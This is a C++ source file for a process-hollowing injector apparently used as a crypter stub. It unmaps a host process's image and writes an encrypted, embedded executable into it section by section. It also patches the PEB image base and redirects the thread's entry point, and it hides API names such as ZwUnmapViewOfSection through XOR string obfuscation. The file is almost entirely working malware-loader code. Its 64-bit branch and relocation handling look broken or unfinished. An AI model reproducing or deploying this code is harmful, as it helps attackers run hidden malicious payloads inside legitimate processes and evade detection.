#include "process_injector.h"
#include "string_crypt.h"

#define STATUS_SUCCESS 0x00000000
#define STATUS_ACCESS_DENIED 0xC0000022


extern uint64_t file_size;
extern uint8_t encrypted_file[];

// singleton
process_injector_t* process_injector_t::instance = nullptr;


process_injector_t* process_injector_t::get_instance(uint8_t *pointer_to_buffer, HANDLE hProcess, HANDLE hThread)
{
	if (instance == nullptr)
		instance = new process_injector_t(pointer_to_buffer, hProcess, hThread);

	return instance;
}


process_injector_t::process_injector_t(uint8_t *pointer_to_buffer, HANDLE hProcess, HANDLE hThread) :
	process_buffer{ pointer_to_buffer },
	process_handler{ hProcess },
	thread_handler{ hThread },
	base_address_{ nullptr },
	image_size_{ 0 },
	header_size_{ 0 }
{}


process_injector_t::~process_injector_t() = default;


bool process_injector_t::inject_into_process()
{
	if (!get_binary_values())
		return false;

	if (!allocate_new_space(this->process_handler, this->base_address_, this->image_size_))
	{
		if (!unmap_process(this->process_handler, this->base_address_))
			return false;

		if (!allocate_new_space(this->process_handler, this->base_address_, this->image_size_))
			return false;
	}

	if (!inject_pe_header(this->base_address_, this->process_handler))
		return false;

	if (!inject_sections_to_executable(this->base_address_, this->process_handler))
		return false;

	if (!fix_context(this->thread_handler))
		return false;

	return true;
}


bool process_injector_t::set_sections_protections()
{
	DWORD old_protection;

	if (!VirtualProtectEx(this->process_handler, this->base_address_, this->image_size_, PAGE_EXECUTE_READWRITE, &old_protection))
		return false;

	return true;
}


PVOID process_injector_t::base_address()
{
	return this->base_address_;
}


uint32_t process_injector_t::image_size()
{
	return this->image_size_;
}


uint32_t process_injector_t::header_size()
{
	return this->header_size_;
}


uint32_t process_injector_t::entry_point()
{
	return this->entry_point_;
}


bool process_injector_t::unmap_process(HANDLE hProcess, PVOID base_address)
{
	typedef LONG(NTAPI *pfnZwUnmapViewOfSection)(HANDLE, PVOID);
	HMODULE hMod = GetModuleHandleA(XorString("ntdll"));
	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hMod, XorString("ZwUnmapViewOfSection"));

	NTSTATUS returned_status = pZwUnmapViewOfSection(hProcess, base_address);

	if (returned_status == STATUS_SUCCESS)
		return true;
	return false;
}


bool process_injector_t::allocate_new_space(HANDLE hProcess, PVOID base_address, uint32_t image_size)
{
	LPVOID returned_value = VirtualAllocEx(
		hProcess,
		base_address,
		image_size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	if (returned_value == NULL)
		return false;
	return true;
}


bool process_injector_t::get_binary_values()
{
	IMAGE_DOS_HEADER* image_dos_header = (IMAGE_DOS_HEADER*)this->process_buffer;

	if (image_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
		return false;

	IMAGE_NT_HEADERS* image_nt_headers = (IMAGE_NT_HEADERS*)((uintptr_t)this->process_buffer + image_dos_header->e_lfanew);

	if (image_nt_headers->Signature != IMAGE_NT_SIGNATURE)
		return false;

#ifndef WIN64
	// check correct binary
	if (image_nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)
		return false;

#endif // !WIN64


	base_address_ = (PVOID)image_nt_headers->OptionalHeader.ImageBase;
	image_size_ = (uint32_t)image_nt_headers->OptionalHeader.SizeOfImage;
	header_size_ = (uint32_t)image_nt_headers->OptionalHeader.SizeOfHeaders;
	entry_point_ = (uint32_t)image_nt_headers->OptionalHeader.AddressOfEntryPoint;

	return true;
}


bool process_injector_t::inject_pe_header(PVOID header_address, HANDLE hProcess)
{
	SIZE_T number_of_bytes_written;

	if (header_size_ == 0)
		return false;

	if (!WriteProcessMemory(
		hProcess,
		header_address,
		process_buffer,
		header_size_,
		&number_of_bytes_written
	))
		return false;

	if (number_of_bytes_written != header_size_)
		return false;

	FlushInstructionCache(hProcess, header_address, header_size_);

	return true;
}


bool process_injector_t::inject_sections_to_executable(PVOID base_address, HANDLE hProcess)
{
	IMAGE_DOS_HEADER* image_dos_header = (IMAGE_DOS_HEADER*)this->process_buffer;
	IMAGE_NT_HEADERS* image_nt_headers = (IMAGE_NT_HEADERS*)((uintptr_t)this->process_buffer + image_dos_header->e_lfanew);
	IMAGE_SECTION_HEADER* image_section_header = (IMAGE_SECTION_HEADER*)((uintptr_t)this->process_buffer + image_dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	uint16_t number_of_sections = image_nt_headers->FileHeader.NumberOfSections;

	SIZE_T number_of_bytes_written;

	for (uint16_t i = 0; i < number_of_sections; i++)
	{
		LPVOID address_to_write = (LPVOID)((uintptr_t)base_address + image_section_header[i].VirtualAddress);
		LPCVOID buffer_address_section = (LPCVOID)((uintptr_t)this->process_buffer + image_section_header[i].PointerToRawData);
		if (!WriteProcessMemory(
			hProcess,
			address_to_write,
			buffer_address_section,
			image_section_header[i].SizeOfRawData,
			&number_of_bytes_written
		))
			return false;

		if (number_of_bytes_written != image_section_header[i].SizeOfRawData)
			return false;

		FlushInstructionCache(hProcess, address_to_write, image_section_header[i].Misc.VirtualSize);
	}

	return true;
}


bool process_injector_t::load_imports(PVOID base_address, HANDLE hProcess)
{
	IMAGE_DOS_HEADER* image_dos_header = (IMAGE_DOS_HEADER*)this->process_buffer;
	IMAGE_NT_HEADERS* image_nt_headers = (IMAGE_NT_HEADERS*)((uintptr_t)this->process_buffer + image_dos_header->e_lfanew);
	IMAGE_DATA_DIRECTORY* image_data_directory = &(image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);

	uint64_t descriptor_offset = this->rva_to_offset(this->process_buffer, image_data_directory->VirtualAddress);

	IMAGE_IMPORT_DESCRIPTOR* descriptor = (IMAGE_IMPORT_DESCRIPTOR*)((uint64_t)this->process_buffer + descriptor_offset);

	size_t index = 0;
	SIZE_T bytes_written;

	while (descriptor[index].Name != 0)
	{
		uintptr_t name_address;
		HMODULE imported_dll_base_address;

		name_address = ((uintptr_t)this->process_buffer + this->rva_to_offset(this->process_buffer, descriptor[index].Name));

		printf("Processing import for: %s\n", (char *)name_address);

		imported_dll_base_address = LoadLibraryA((char *)name_address);

		uint32_t n_functions = 0;
		uint32_t n_ordinals = 0;

		uintptr_t first_thunk_address = (uintptr_t)base_address + descriptor[index].FirstThunk;
		uintptr_t first_thunk_offset = (uintptr_t)this->process_buffer + rva_to_offset(this->process_buffer, descriptor[index].FirstThunk);
		uintptr_t origninal_first_thunk_offset;

		if (descriptor[index].OriginalFirstThunk != 0)
			origninal_first_thunk_offset = (uintptr_t)this->process_buffer + rva_to_offset(this->process_buffer, descriptor[index].OriginalFirstThunk);
		else
			origninal_first_thunk_offset = (uintptr_t)this->process_buffer + rva_to_offset(this->process_buffer, descriptor[index].FirstThunk);


		IMAGE_THUNK_DATA* IAT = (IMAGE_THUNK_DATA*)first_thunk_offset;
		IMAGE_THUNK_DATA* INT = (IMAGE_THUNK_DATA*)origninal_first_thunk_offset;

		while (IAT->u1.Function != 0)
		{
			if (INT->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				printf("\tFound Import Ordinal: 0x%x", INT->u1.Ordinal);

				IAT->u1.Function = (DWORD)GetProcAddress(imported_dll_base_address, MAKEINTRESOURCEA(INT->u1.Ordinal));

				printf("\tfunction address: 0x%x\n", IAT->u1.Function);
			}
			else
			{
				IMAGE_IMPORT_BY_NAME* name_array;
				uintptr_t routine_name_offset;

				name_array = (IMAGE_IMPORT_BY_NAME*)((uintptr_t)this->process_buffer + (uintptr_t)rva_to_offset(this->process_buffer, INT->u1.AddressOfData));
				routine_name_offset = (uintptr_t)name_array->Name;


				printf("\tFound Import Name: %s", (char *)routine_name_offset);
				printf("\tRVA: 0x%X", IAT->u1.Function);

				/*
				*	Now overwrite IAT entry with address of imported routine
				*/
				IAT->u1.Function = (DWORD)GetProcAddress(imported_dll_base_address, (LPCSTR)routine_name_offset);
				printf("\tfunction address: 0x%x\n", IAT->u1.Function);
				n_functions++;
			}

			if (!WriteProcessMemory(
				hProcess,
				(LPVOID)first_thunk_address,
				(LPCVOID)&IAT->u1.Function,
				sizeof(DWORD),
				&bytes_written)
				)
				return false;

			if (bytes_written != sizeof(DWORD))
				return false;

			FlushInstructionCache(hProcess, (LPVOID)first_thunk_address, sizeof(DWORD));

			first_thunk_address += sizeof(DWORD);
			IAT++;
			INT++;
		}

		index++;
	}

	return true;
}


uint64_t process_injector_t::rva_to_offset(PVOID base_address, uint64_t rva)
{
	IMAGE_DOS_HEADER* image_dos_header = (IMAGE_DOS_HEADER*)this->process_buffer;
	IMAGE_NT_HEADERS* image_nt_headers = (IMAGE_NT_HEADERS*)((uintptr_t)this->process_buffer + image_dos_header->e_lfanew);
	IMAGE_SECTION_HEADER* image_section_header = (IMAGE_SECTION_HEADER*)((uintptr_t)this->process_buffer + image_dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	size_t index = -1;

	for (size_t i = 0; i < image_nt_headers->FileHeader.NumberOfSections; i++)
	{
		if (image_section_header[i].VirtualAddress <= rva && rva <= (image_section_header[i].VirtualAddress + image_section_header[i].Misc.VirtualSize))
		{
			index = i;
			break;
		}
	}

	if (index == -1)
		return rva;

	uint64_t section_rva = (uint64_t)image_section_header[index].VirtualAddress;
	uint64_t section_offset = (uint64_t)image_section_header[index].PointerToRawData;

	return ((rva - section_rva) + section_offset);
}


uint64_t process_injector_t::offset_to_rva(PVOID base_address, uint64_t offset)
{
	IMAGE_DOS_HEADER* image_dos_header = (IMAGE_DOS_HEADER*)this->process_buffer;
	IMAGE_NT_HEADERS* image_nt_headers = (IMAGE_NT_HEADERS*)((uintptr_t)this->process_buffer + image_dos_header->e_lfanew);
	IMAGE_SECTION_HEADER* image_section_header = (IMAGE_SECTION_HEADER*)((uintptr_t)this->process_buffer + image_dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	size_t index = -1;

	for (size_t i = 0; i < image_nt_headers->FileHeader.NumberOfSections; i++)
	{
		if (image_section_header[i].PointerToRawData <= offset && offset <= (image_section_header[i].PointerToRawData + image_section_header[i].SizeOfRawData))
		{
			index = i;
			break;
		}
	}

	if (index == -1)
		return offset;

	uint64_t section_rva = (uint64_t)image_section_header[index].VirtualAddress;
	uint64_t section_offset = (uint64_t)image_section_header[index].PointerToRawData;

	return ((offset - section_offset) + section_rva);
}


bool process_injector_t::fix_context(HANDLE hThread)
{
	CONTEXT context = { CONTEXT_FULL };
	PROCESS_BASIC_INFORMATION p_basic_info;
	DWORD returned_length, bytes_read, bytes_write;

	HMODULE hNTDLL = LoadLibraryA(XorString("ntdll"));

	if (!hNTDLL)
		return false;

	typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		DWORD ProcessInformationLength,
		PDWORD ReturnLength
		);


	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hNTDLL, XorString("NtQueryInformationProcess"));

	if (!NtQueryInformationProcess)
		return false;


	NtQueryInformationProcess(this->process_handler, 0, &p_basic_info, sizeof(PROCESS_BASIC_INFORMATION), &returned_length);

	PEB peb;

	if (!ReadProcessMemory(
		this->process_handler,
		(LPCVOID)p_basic_info.PebBaseAddress,
		&peb,
		sizeof(PEB),
		&bytes_read
	))
		return false;

	printf("PEB from process information:\n");
	printf("\tImage base address: 0x%X", (unsigned int)peb.ImageBaseAddress);

	peb.ImageBaseAddress = this->base_address_;

	if (!WriteProcessMemory(
		this->process_handler,
		(LPVOID)p_basic_info.PebBaseAddress,
		&peb,
		sizeof(PEB),
		&bytes_write
	))
		return false;


	if (!GetThreadContext(hThread, &context))
	{
		printf("GetThreadContext error: 0x%X\n", GetLastError());
		return false;
	}
#ifndef WIN64
	context.Eax = (uint32_t)this->base_address_ + entry_point_;
#else
	context.Rax = (uint64_t)this->base_address + entry_point;
#endif // !WIN64

	if (!SetThreadContext(hThread, &context))
	{
		printf("SetThreadContext error: 0x%X\n", GetLastError());
		return false;
	}
	return true;
}


bool process_injector_t::fix_relocs(PVOID base_address, HANDLE hProcess)
{
	return true;
}